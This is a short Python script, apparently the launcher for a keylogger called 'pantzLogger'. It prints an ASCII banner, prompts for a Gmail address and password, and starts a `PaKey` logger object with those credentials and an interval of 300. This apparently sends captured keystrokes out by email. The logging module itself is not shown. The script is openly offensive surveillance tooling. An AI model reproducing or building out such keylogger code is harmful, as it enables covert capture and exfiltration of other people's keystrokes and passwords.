#!/usr/bin/env python
import paKey

print(""""
             ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  ____ 
            ||p ||||a ||||n ||||t ||||z ||||L ||||o ||||g ||||g ||||e ||||r ||
            ||__||||__||||__||||__||||__||||__||||__||||__||||__||||__||||__||
            |/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\|                                                                                                                                                                                          """
      "")
print("Login to your gmail account:")
email = input("Email: ")
password = input("Password: ")

my_logger = paKey.PaKey(300, email, password)
my_logger.start()
